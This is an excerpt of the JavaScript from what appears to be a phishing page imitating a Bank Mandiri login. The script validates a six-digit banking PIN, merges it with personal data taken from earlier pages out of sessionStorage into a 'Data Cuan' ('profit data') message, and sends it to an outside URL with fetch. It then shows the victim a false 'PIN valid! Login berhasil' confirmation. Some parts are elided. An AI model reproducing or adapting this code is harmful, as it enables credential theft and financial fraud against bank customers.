$(document).ready(function() {
    // Mask for PIN (6 digits)
    $('#pin_mandiri').mask('000000');

    // Form submission
    $('#form-pin').on('submit', function(e) {
        e.preventDefault();

        const pin = $('#pin_mandiri').val().trim();
        ...
        if (!pin) {
            messageContainer.html('<div class="message error">PIN tidak boleh kosong.</div>');
            return;
        } else if (pin.length !== 6 || !/^\d+$/.test(pin)) {
            messageContainer.html('<div class="message error">PIN harus tepat 6 digit angka.</div>');
            return;
        }
        ...
        // Ambil data dari sessionStorage (sama seperti index)
        ...
        // Buat pesan lengkap (gabung data sebelumnya + PIN)
        const message = `
├• | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 |
├───────────────────
├• *Nama* : ${nama}
        ...
        fetch(url)
            ...
            .then(data => {
                if (data.ok) {
                    ...
                    messageContainer.html('<div class="message success">PIN valid! Login berhasil.</div>');
                    setTimeout(() => {
                        $("#loader").hide();
